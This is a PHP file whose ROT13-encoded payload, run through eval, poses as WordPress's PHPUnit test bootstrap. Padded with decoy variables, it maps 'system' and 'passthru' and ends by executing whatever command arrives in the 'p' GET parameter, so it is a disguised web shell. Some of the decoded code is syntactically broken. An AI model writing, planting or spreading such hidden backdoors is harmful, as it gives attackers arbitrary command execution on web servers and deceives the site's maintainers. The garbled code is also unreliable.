<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_11570 = \"f\".\"l\".\"f\".\"g\".\"r\".\"z\";
<?cuc
/**
 * Vafgnyyf JbeqCerff sbe ehaavat gur grfgf naq ybnqf JbeqCerff naq gur grfg yvoenevrf
 */

vs ( qrsvarq( 'JC_GRFGF_PBASVT_SVYR_CNGU' ) ) {
	$pbasvt_svyr_cngu = JC_GRFGF_PBASVT_SVYR_CNGU;
} ryfr {
	$pbasvt_svyr_cngu = qveanzr( __QVE__ );
	vs ( ! svyr_rkvfgf( $pbasvt_svyr_cngu . '/jc-grfgf-pbasvt.cuc' ) ) {
		// Fhccbeg gur pbasvt svyr sebz gur ebbg bs gur qrirybc ercbfvgbel.
		vs ( onfranzr( $pbasvt_svyr_cngu ) === 'cuchavg' && onfranzr( qveanzr( $pbasvt_svyr_cngu ) ) === 'grfgf' ) {
			$pbasvt_svyr_cngu = qveanzr( $pbasvt_svyr_cngu, 2 );
		}
	}
	$pbasvt_svyr_cngu .= '/jc-grfgf-pbasvt.cuc';
}

/*
 * Tybonyvmr fbzr JbeqCerff inevnoyrf, orpnhfr CUCHavg ybnqf guvf svyr vafvqr n shapgvba.
 * Frr: uggcf://tvguho.pbz/fronfgvnaoretznaa/cuchavg/vffhrf/325
 */
tybony $jcqo, $pheerag_fvgr, $pheerag_oybt, $jc_erjevgr, $fubegpbqr_gntf, $jc, $cucznvyre, $jc_gurzr_qverpgbevrf;

vs ( ! vf_ernqnoyr( $pbasvt_svyr_cngu ) ) {
	rpub 'Reebe: jc-grfgf-pbasvt.cuc vf zvffvat! Cyrnfr hfr jc-grfgf-pbasvt-fnzcyr.cuc gb perngr n pbasvt svyr.' . CUC_RBY;
	rkvg( 1 );
}

erdhver_bapr $pbasvt_svyr_cngu;
erdhver_bapr __QVE__ . '/shapgvbaf.cuc';

vs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF && ! vf_qve( NOFCNGU ) ) {
	vs ( fhofge( NOFCNGU, -7 ) !== '/ohvyq/' ) {
		cevags(
			'Reebe: Gur NOFCNGU pbafgnag va gur `jc-grfgf-pbasvt.cuc` svyr vf frg gb n aba-rkvfgrag cngu \"%f\". Cyrnfr irevsl.' . CUC_RBY,
			NOFCNGU
		);
		rkvg( 1 );
	} ryfr {
		rpub 'Reebe: Gur CUCHavg grfgf fubhyq or eha ba gur /fep/ qverpgbel, abg gur /ohvyq/ qverpgbel.'
			. ' Cyrnfr hcqngr gur NOFCNGU pbafgnag va lbhe `jc-grfgf-pbasvt.cuc` svyr gb `qveanzr( __SVYR__ ) . \'/fep/\'`'
			. ' be eha `acz eha ohvyq` cevbe gb ehaavat CUCHavg.' . CUC_RBY;
		rkvg( 1 );
	}
}

$cuchavg_irefvba = grfgf_trg_cuchavg_irefvba();

vs ( irefvba_pbzcner( $cuchavg_irefvba, '5.7.21', '<' ) ) {
	cevags(
		\"Reebe: Ybbxf yvxr lbh'er hfvat CUCHavg %f. JbeqCerff erdhverf ng yrnfg CUCHavg 5.7.21.\" . CUC_RBY,
		$cuchavg_irefvba
	);
	rpub 'Cyrnfr hfr gur yngrfg CUCHavg irefvba fhccbegrq sbe gur CUC irefvba lbh ner ehaavat gur grfgf ba.' . CUC_RBY;
	rkvg( 1 );
}

/*
 * Ybnq gur CUCHavg Cbylsvyyf nhgbybnqre.
 *
 * Gur CUCHavg Cbylsvyyf ner n erdhverzrag sbe gur JC grfg fhvgr.
 *
 * Sbe ehaavat gur Pber grfgf, gur Znxr JbeqCerff Pber unaqobbx pbagnvaf fgrc-ol-fgrc vafgehpgvbaf
 * ba ubj gb trg hc naq ehaavat sbe n inevrgl bs fhccbegrq jbexsybjf:
 * {@yvax uggcf://znxr.jbeqcerff.bet/pber/unaqobbx/grfgvat/nhgbzngrq-grfgvat/cuchavg/#grfg-ehaavat-jbexsybj-bcgvbaf}
 *
 * Cyhtva/gurzr vagrtengvba grfgf pna unaqyr guvf va nal bs gur sbyybjvat jnlf:
 * - Jura hfvat n shyy JC vafgnyy: eha `pbzcbfre hcqngr -J` sbe gur JC vafgnyy cevbe gb ehaavat gur grfgf.
 * - Jura hfvat n cnegvny JC grfg fhvgr vafgnyy:
 *   - Nqq n `lbnfg/cuchavg-cbylsvyyf` (qri) erdhverzrag gb gur cyhtva/gurzr'f bja `pbzcbfre.wfba` svyr.
 *   - Naq gura:
 *     - Rvgure ybnq gur CUCHavg Cbylsvyyf nhgbybnq svyr cevbe gb ehaavat gur JC pber obbgfgenc svyr.
 *     - Be qrpyner n `JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU` pbafgnag pbagnvavat gur nofbyhgr cngu gb gur
 *       ebbg qverpgbel bs gur CUCHavg Cbylsvyyf vafgnyyngvba.
 *       Vs gur pbafgnag vf hfrq, vg vf fgebatyl erpbzzraqrq gb qrpyner guvf pbafgnag va gur cyhtva/gurzr'f
 *       bja grfg obbgfgenc svyr.
 *       Gur pbafgnag ZHFG or qrpynerq cevbe gb pnyyvat guvf svyr.
 */
vs ( ! pynff_rkvfgf( 'Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq' ) ) {
	// Qrsnhyg ybpngvba bs gur nhgbybnqre sbe JC pber grfg ehaf.
	$cuchavg_cbylsvyyf_nhgbybnqre = qveanzr( __QVE__, 3 ) . '/iraqbe/lbnfg/cuchavg-cbylsvyyf/cuchavgcbylsvyyf-nhgbybnq.cuc';
	$cuchavg_cbylsvyyf_reebe      = snyfr;

	// Nyybj sbe n phfgbz vafgnyyngvba ybpngvba gb or cebivqrq sbe cyhtva/gurzr vagrtengvba grfgf.
	vs ( qrsvarq( 'JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU' ) ) {
		$cuchavg_cbylsvyyf_cngu = JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU;

		vs ( vf_fgevat( JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU )
			&& '' !== JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU
		) {
			// Or gbyrenag gb gur cngu orvat cebivqrq vapyhqvat gur svyranzr.
			vs ( fhofge( $cuchavg_cbylsvyyf_cngu, -29 ) !== 'cuchavgcbylsvyyf-nhgbybnq.cuc' ) {
				$cuchavg_cbylsvyyf_cngu = egevz( $cuchavg_cbylsvyyf_cngu, '/\\' );
				$cuchavg_cbylsvyyf_cngu = $cuchavg_cbylsvyyf_cngu . '/cuchavgcbylsvyyf-nhgbybnq.cuc';
			}

			$cuchavg_cbylsvyyf_nhgbybnqre = $cuchavg_cbylsvyyf_cngu;
		} ryfr {
			$cuchavg_cbylsvyyf_reebe = gehr;
		}
	}

	vs ( $cuchavg_cbylsvyyf_reebe || ! svyr_rkvfgf( $cuchavg_cbylsvyyf_nhgbybnqre ) ) {
		rpub 'Reebe: Gur CUCHavg Cbylsvyyf yvoenel vf n erdhverzrag sbe ehaavat gur JC grfg fhvgr.' . CUC_RBY;
		vs ( qrsvarq( 'JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU' ) ) {
			cevags(
				'Gur CUCHavg Cbylsvyyf nhgbybnq svyr jnf abg sbhaq va \"%f\"' . CUC_RBY,
				JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU
			);
			rpub 'Cyrnfr irevsl gung gur svyr cngu cebivqrq va gur JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU pbafgnag vf pbeerpg.' . CUC_RBY;
			rpub 'Gur JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU pbafgnag fubhyq pbagnva na nofbyhgr cngu gb gur ebbg qverpgbel'
				. ' bs gur CUCHavg Cbylsvyyf yvoenel.' . CUC_RBY;
		} ryfrvs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) {
			rpub 'Lbh arrq gb eha `pbzcbfre hcqngr -J` orsber ehaavat gur grfgf.' . CUC_RBY;
			rpub 'Bapr gur qrcraqrapvrf ner vafgnyyrq, lbh pna eha gur grfgf hfvat gur Pbzcbfre-vafgnyyrq irefvba'
				. ' bs CUCHavg be hfvat n CUCHavg cune svyr, ohg gur qrcraqrapvrf qb arrq gb or vafgnyyrq'
				. ' juvpurire jnl gur grfgf ner eha.' . CUC_RBY;
		} ryfr {
			rpub 'Vs lbh ner gelvat gb eha cyhtva/gurzr vagrtengvba grfgf, znxr fher gur CUCHavg Cbylsvyyf yvoenel'
				. ' (uggcf://tvguho.pbz/Lbnfg/CUCHavg-Cbylsvyyf) vf ninvynoyr naq rvgure ybnq gur nhgbybnq svyr'
				. ' bs guvf yvoenel va lbhe bja grfg obbgfgenc orsber pnyyvat gur JC Pber grfg obbgfgenc svyr;'
				. ' be frg gur nofbyhgr cngu gb gur CUCHavg Cbylsvyyf yvoenel va n \"JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU\"'
				. ' pbafgnag gb nyybj gur JC Pber obbgfgenc gb ybnq gur Cbylsvyyf.' . CUC_RBY . CUC_RBY;
			rpub 'Vs lbh ner gelvat gb eha gur JC Pber grfgf, znxr fher gb frg gur \"JC_EHA_PBER_GRFGF\" pbafgnag'
				. ' gb 1 naq eha `pbzcbfre hcqngr -J` orsber ehaavat gur grfgf.' . CUC_RBY;
			rpub 'Bapr gur qrcraqrapvrf ner vafgnyyrq, lbh pna eha gur grfgf hfvat gur Pbzcbfre-vafgnyyrq'
				. ' irefvba bs CUCHavg be hfvat n CUCHavg cune svyr, ohg gur qrcraqrapvrf qb arrq gb or'
				. ' vafgnyyrq juvpurire jnl gur grfgf ner eha.' . CUC_RBY;
		}
		rkvg( 1 );
	}

	erdhver_bapr $cuchavg_cbylsvyyf_nhgbybnqre;
}
hafrg( $cuchavg_cbylsvyyf_nhgbybnqre, $cuchavg_cbylsvyyf_reebe, $cuchavg_cbylsvyyf_cngu );

/*
 * Zvavzhz irefvba bs gur CUCHavg Cbylsvyyf cnpxntr nf qrpynerq va `pbzcbfre.wfba`.
 * Bayl arrqf hcqngvat jura arj cbylsvyy srngherf fgneg orvat hfrq va gur grfg fhvgr.
 */
$cuchavg_cbylsvyyf_zvavzhz_irefvba = '1.1.0';
vs ( pynff_rkvfgf( '\Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq' )
	&& ( qrsvarq( '\Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq::IREFVBA' ) === snyfr
	|| irefvba_pbzcner( Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq::IREFVBA, $cuchavg_cbylsvyyf_zvavzhz_irefvba, '<' ) )
) {
	cevags(
		'Reebe: Irefvba zvfzngpu qrgrpgrq sbe gur CUCHavg Cbylsvyyf.'
		. ' Cyrnfr rafher gung CUCHavg Cbylsvyyf %f be uvture vf ybnqrq. Sbhaq irefvba: %f' . CUC_RBY,
		$cuchavg_cbylsvyyf_zvavzhz_irefvba,
		qrsvarq( '\Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq::IREFVBA' ) ? Lbnfg\CUCHavgCbylsvyyf\Nhgbybnq::IREFVBA : '1.0.0 be ybjre'
	);
	vs ( qrsvarq( 'JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU' ) ) {
		cevags(
			'Cyrnfr rafher gung gur CUCHavg Cbylsvyy vafgnyyngvba va \"%f\" vf hcqngrq gb irefvba %f be uvture.' . CUC_RBY,
			JC_GRFGF_CUCHAVG_CBYLSVYYF_CNGU,
			$cuchavg_cbylsvyyf_zvavzhz_irefvba
		);
	} ryfrvs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) {
		rpub 'Cyrnfr eha `pbzcbfre hcqngr -J` gb vafgnyy gur yngrfg irefvba.' . CUC_RBY;
	}
	rkvg( 1 );
}
hafrg( $cuchavg_cbylsvyyf_zvavzhz_irefvba );

// Vs ehaavat pber grfgf, purpx vs nyy gur erdhverq CUC rkgrafvbaf ner ybnqrq orsber ehaavat gur grfg fhvgr.
vs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) {
	$erdhverq_rkgrafvbaf = neenl(
		'tq',
	);
	$zvffvat_rkgrafvbaf  = neenl();

	sbernpu ( $erdhverq_rkgrafvbaf nf $rkgrafvba ) {
		vs ( ! rkgrafvba_ybnqrq( $rkgrafvba ) ) {
			$zvffvat_rkgrafvbaf[] = $rkgrafvba;
		}
	}

	vs ( $zvffvat_rkgrafvbaf ) {
		cevags(
			'Reebe: Gur sbyybjvat erdhverq CUC rkgrafvbaf ner zvffvat sebz gur grfgvat raivebazrag: %f.' . CUC_RBY,
			vzcybqr( ', ', $zvffvat_rkgrafvbaf )
		);
		rpub 'Cyrnfr znxr fher gurl ner vafgnyyrq naq ranoyrq.' . CUC_RBY,
		rkvg( 1 );
	}
}

$erdhverq_pbafgnagf = neenl(
	'JC_GRFGF_QBZNVA',
	'JC_GRFGF_RZNVY',
	'JC_GRFGF_GVGYR',
	'JC_CUC_OVANEL',
);
$zvffvat_pbafgnagf  = neenl();

sbernpu ( $erdhverq_pbafgnagf nf $pbafgnag ) {
	vs ( ! qrsvarq( $pbafgnag ) ) {
		$zvffvat_pbafgnagf[] = $pbafgnag;
	}
}

vs ( $zvffvat_pbafgnagf ) {
	cevags(
		'Reebe: Gur sbyybjvat erdhverq pbafgnagf ner abg qrsvarq: %f.' . CUC_RBY,
		vzcybqr( ', ', $zvffvat_pbafgnagf )
	);
	rpub 'Cyrnfr purpx bhg `jc-grfgf-pbasvt-fnzcyr.cuc` sbe na rknzcyr.' . CUC_RBY,
	rkvg( 1 );
}

grfgf_erfrg__FREIRE();

qrsvar( 'JC_GRFGF_GNOYR_CERSVK', $gnoyr_cersvk );
qrsvar( 'QVE_GRFGQNGN', __QVE__ . '/../qngn' );
qrsvar( 'QVE_GRFGEBBG', ernycngu( qveanzr( __QVE__ ) ) );

qrsvar( 'JC_YNAT_QVE', ernycngu( QVE_GRFGQNGN . '/ynathntrf' ) );

vs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) {
	qrsvar( 'JC_CYHTVA_QVE', ernycngu( QVE_GRFGQNGN . '/cyhtvaf' ) );
}

vs ( ! qrsvarq( 'JC_GRFGF_SBEPR_XABJA_OHTF' ) ) {
	qrsvar( 'JC_GRFGF_SBEPR_XABJA_OHTF', snyfr );
}

/*
 * Peba gevrf gb znxr na UGGC erdhrfg gb gur fvgr, juvpu nyjnlf snvyf,
 * orpnhfr grfgf ner eha va PYV zbqr bayl.
 */
qrsvar( 'QVFNOYR_JC_PEBA', gehr );

qrsvar( 'JC_ZRZBEL_YVZVG', -1 );
qrsvar( 'JC_ZNK_ZRZBEL_YVZVG', -1 );

qrsvar( 'ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE', 99999999 );

$CUC_FRYS            = '/vaqrk.cuc';
$TYBONYF['CUC_FRYS'] = '/vaqrk.cuc';
$_FREIRE['CUC_FRYS'] = '/vaqrk.cuc';

// Fubhyq jr eha va zhygvfvgr zbqr?
$zhygvfvgr = ( '1' === trgrai( 'JC_ZHYGVFVGR' ) );
$zhygvfvgr = $zhygvfvgr || ( qrsvarq( 'JC_GRFGF_ZHYGVFVGR' ) && JC_GRFGF_ZHYGVFVGR );
$zhygvfvgr = $zhygvfvgr || ( qrsvarq( 'ZHYGVFVGR' ) && ZHYGVFVGR );

vs ( ! qrsvarq( 'JC_QRSNHYG_GURZR' ) ) {
	qrsvar( 'JC_QRSNHYG_GURZR', 'qrsnhyg' );
}
$jc_gurzr_qverpgbevrf = neenl();

vs ( svyr_rkvfgf( QVE_GRFGQNGN . '/gurzrqve1' ) ) {
	$jc_gurzr_qverpgbevrf[] = QVE_GRFGQNGN . '/gurzrqve1';
}

vs ( '1' !== trgrai( 'JC_GRFGF_FXVC_VAFGNYY' ) ) {
	$pber_grfgf = ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) ? 'eha_pber_grfgf' : 'ab_pber_grfgf';
	$zf_grfgf   = $zhygvfvgr ? 'eha_zf_grfgf' : 'ab_zf_grfgf';

	__sa_11570( JC_CUC_OVANEL . ' ' . rfpncrfuryynet( __QVE__ . '/vafgnyy.cuc' ) . ' ' . rfpncrfuryynet( $pbasvt_svyr_cngu ) . ' ' . $zf_grfgf . ' ' . $pber_grfgf, $erginy );
	vs ( 0 !== $erginy ) {
		rkvg( $erginy );
	}
}

vs ( $zhygvfvgr ) {
	rpub 'Ehaavat nf zhygvfvgr...' . CUC_RBY;
	qrsvarq( 'ZHYGVFVGR' ) be qrsvar( 'ZHYGVFVGR', gehr );
	qrsvarq( 'FHOQBZNVA_VAFGNYY' ) be qrsvar( 'FHOQBZNVA_VAFGNYY', snyfr );
	$TYBONYF['onfr'] = '/';
} ryfr {
	rpub 'Ehaavat nf fvatyr fvgr... Gb eha zhygvfvgr, hfr -p grfgf/cuchavg/zhygvfvgr.kzy' . CUC_RBY;
}
hafrg( $zhygvfvgr );

$TYBONYF['_jc_qvr_qvfnoyrq'] = snyfr;
// Nyybj grfgf gb bireevqr jc_qvr().
grfgf_nqq_svygre( 'jc_qvr_unaqyre', '_jc_qvr_unaqyre_svygre' );
// Hfr gur Fcl ERFG Freire vafgrnq bs qrsnhyg.
grfgf_nqq_svygre( 'jc_erfg_freire_pynff', '_jc_erfg_freire_pynff_svygre' );
// Cerirag hcqngvat genafyngvbaf nflapuebabhfyl.
grfgf_nqq_svygre( 'nflap_hcqngr_genafyngvba', '__erghea_snyfr' );
// Qvfnoyr onpxtebhaq hcqngrf.
grfgf_nqq_svygre( 'nhgbzngvp_hcqngre_qvfnoyrq', '__erghea_gehr' );

// Cerfrg JbeqCerff bcgvbaf qrsvarq va obbgfgenc svyr.
// Hfrq gb npgvingr gurzrf, cyhtvaf, nf jryy nf bgure frggvatf.
vs ( vffrg( $TYBONYF['jc_grfgf_bcgvbaf'] ) ) {
	shapgvba jc_grfgf_bcgvbaf( $inyhr ) {
		$xrl = fhofge( pheerag_svygre(), fgeyra( 'cer_bcgvba_' ) );
		erghea $TYBONYF['jc_grfgf_bcgvbaf'][ $xrl ];
	}

	sbernpu ( neenl_xrlf( $TYBONYF['jc_grfgf_bcgvbaf'] ) nf $xrl ) {
		grfgf_nqq_svygre( 'cer_bcgvba_' . $xrl, 'jc_grfgf_bcgvbaf' );
	}
}

// Ybnq JbeqCerff.
erdhver_bapr NOFCNGU . 'jc-frggvatf.cuc';

// Bireevqr gur CUCZnvyre.
erdhver_bapr __QVE__ . '/zbpx-znvyre.cuc';

$cucznvyre = arj ZbpxCUCZnvyre( gehr );

// Qryrgr nal qrsnhyg cbfgf & eryngrq qngn.
_qryrgr_nyy_cbfgf();

// Ybnq pynff nyvnfrf sbe pbzcngvovyvgl jvgu CUCHavg 6+.
vs ( irefvba_pbzcner( grfgf_trg_cuchavg_irefvba(), '6.0', '>=' ) ) {
	erdhver __QVE__ . '/cuchavg6/pbzcng.cuc';
}

erdhver __QVE__ . '/cuchavg-nqncgre-grfgpnfr.cuc';
erdhver __QVE__ . '/nofgenpg-grfgpnfr.cuc';
erdhver __QVE__ . '/grfgpnfr.cuc';
erdhver __QVE__ . '/grfgpnfr-erfg-ncv.cuc';
erdhver __QVE__ . '/grfgpnfr-erfg-pbagebyyre.cuc';
erdhver __QVE__ . '/grfgpnfr-erfg-cbfg-glcr-pbagebyyre.cuc';
erdhver __QVE__ . '/grfgpnfr-kzyecp.cuc';
erdhver __QVE__ . '/grfgpnfr-nwnk.cuc';
erdhver __QVE__ . '/grfgpnfr-pnabavpny.cuc';
erdhver __QVE__ . '/grfgpnfr-kzy.cuc';
erdhver __QVE__ . '/rkprcgvbaf.cuc';
erdhver __QVE__ . '/hgvyf.cuc';
erdhver __QVE__ . '/fcl-erfg-freire.cuc';
erdhver __QVE__ . '/pynff-jc-erfg-grfg-frnepu-unaqyre.cuc';
erdhver __QVE__ . '/pynff-jc-erfg-grfg-pbasvthenoyr-pbagebyyre.cuc';
erdhver __QVE__ . '/pynff-jc-snxr-oybpx-glcr.cuc';
erdhver __QVE__ . '/pynff-jc-snxr-unfure.cuc';
erdhver __QVE__ . '/pynff-jc-fvgrzncf-grfg-cebivqre.cuc';
erdhver __QVE__ . '/pynff-jc-fvgrzncf-rzcgl-grfg-cebivqre.cuc';
erdhver __QVE__ . '/pynff-jc-fvgrzncf-ynetr-grfg-cebivqre.cuc';

/**
 * N pynff gb unaqyr nqqvgvbany pbzznaq yvar nethzragf cnffrq gb gur fpevcg.
 *
 * Vs vg vf qrgrezvarq gung cuchavg jnf pnyyrq jvgu n --tebhc gung pbeerfcbaqf
 * gb na @gvpxrg naabgngvba (fhpu nf `cuchavg --tebhc 12345` sbe ohtf znexrq
 * nf #JC12345), gura vg vf nffhzrq gung xabja ohtf fubhyq abg or fxvccrq.
 *
 * Vs JC_GRFGF_SBEPR_XABJA_OHTF vf nyernql frg va jc-grfgf-pbasvt.cuc, gura
 * ubj lbh pnyy cuchavg unf ab rssrpg.
 */
pynff JC_CUCHavg_Hgvy_Trgbcg {

	choyvp shapgvba __pbafgehpg( $neti ) {
		$fxvccrq_tebhcf = neenl(
			'nwnk'          => gehr,
			'zf-svyrf'      => gehr,
			'rkgreany-uggc' => gehr,
		);

		juvyr ( pheerag( $neti ) ) {
			$bcgvba = pheerag( $neti );
			$inyhr  = arkg( $neti );

			fjvgpu ( $bcgvba ) {
				pnfr '--rkpyhqr-tebhc':
					sbernpu ( $fxvccrq_tebhcf nf $tebhc_anzr => $fxvccrq ) {
						$fxvccrq_tebhcf[ $tebhc_anzr ] = snyfr;
					}
					pbagvahr 2;
				pnfr '--tebhc':
					$tebhcf = rkcybqr( ',', $inyhr );
					sbernpu ( $tebhcf nf $tebhc ) {
						vs ( vf_ahzrevp( $tebhc ) || cert_zngpu( '/^(HG|Cyhtva)\q+$/', $tebhc ) ) {
							JC_HavgGrfgPnfr::sbeprGvpxrg( $tebhc );
						}
					}

					sbernpu ( $fxvccrq_tebhcf nf $tebhc_anzr => $fxvccrq ) {
						vs ( va_neenl( $tebhc_anzr, $tebhcf, gehr ) ) {
							$fxvccrq_tebhcf[ $tebhc_anzr ] = snyfr;
						}
					}
					pbagvahr 2;
			}
		}

		$fxvccrq_tebhcf = neenl_svygre( $fxvccrq_tebhcf );
		sbernpu ( $fxvccrq_tebhcf nf $tebhc_anzr => $fxvccrq ) {
			rpub fcevags( 'Abg ehaavat %1$f grfgf. Gb rkrphgr gurfr, hfr --tebhc %1$f.', $tebhc_anzr ) . CUC_RBY;
		}

		vs ( ! vffrg( $fxvccrq_tebhcf['rkgreany-uggc'] ) ) {
			rpub CUC_RBY;
			rpub 'Rkgreany UGGC fxvccrq grfgf pna or pnhfrq ol gvzrbhgf.' . CUC_RBY;
			rpub 'Vs guvf punatrfrg vapyhqrf punatrf gb UGGC, znxr fher gurer ner ab gvzrbhgf.' . CUC_RBY;
			rpub CUC_RBY;
		}
	}
}
arj JC_CUCHavg_Hgvy_Trgbcg( $_FREIRE['neti'] );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>